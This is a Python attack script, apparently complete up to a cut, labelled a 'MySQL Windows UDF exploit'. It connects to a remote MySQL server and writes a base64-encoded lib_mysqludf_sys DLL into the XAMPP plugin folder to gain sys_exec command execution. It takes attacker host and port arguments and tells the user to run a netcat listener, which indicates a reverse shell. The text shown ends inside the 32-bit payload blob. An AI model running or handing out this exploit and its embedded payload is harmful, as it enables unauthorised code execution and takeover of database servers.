import mysql.connector
import random
import os
import time
import argparse

# UDF libs: https://github.com/rapid7/metasploit-framework/files/1879611/mysql_udf_libs.zip

print("MySQL Windows UDF exploit.\nNote: run a netcat listener and set up a web server in the current directory before running.")

parser = argparse.ArgumentParser(description='Exploit MySQL with user-defined functions.')
parser.add_argument('-r', '--RHOST', help='Remote IP where the SQL db lives.')
parser.add_argument('-u', dest='user', help='The MySQL user.', required=True)
parser.add_argument('-p', dest='password', help='The MySQL password.', required=True)
parser.add_argument('-a', dest='architecture', help='OS architecture: x86 or x64.', default='x64')
parser.add_argument('-l', '--lhost', dest='lhost', help='Your IP.', required=True)
parser.add_argument('-lp', '--lport', dest='lport', help="Port you're listening on.", required=True)

args = parser.parse_args()


mydb = mysql.connector.connect(
    host = args.RHOST,
    user = args.user,
    password = args.password
)

cursor = mydb.cursor(buffered=True)

# Clear sys_exec from any previous attempts.
cursor.execute("drop function if exists sys_exec")

# Generate a random name for the shared library
dllName = ""

for _ in range(10):
    random_integer = random.randint(97, 97+26-1)
    flip_bit = random.randint(0,1)
    random_integer = random_integer - 32 if flip_bit == 1 else random_integer
    dllName += (chr(random_integer))
   

if args.architecture == 'x64':
    # Load a base64-encoded payload of the 64-bit DLL into the plugins dir.
    # Get this payload from the actual DLL with:
    # cat lib_mysqludf_sys_64.dll | base64 -w 0 > b64-dll
    sql = f"select from_base64('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') into dumpfile 'C:/xampp/mysql/lib/plugin/{dllName}.dll'"
    cursor.execute(sql)
    print("[*] 64-bit architecture selected. Payload: lib_mysqludf_sys_64.dll")
elif args.architecture == 'x86':
    sql = f"select from_base64('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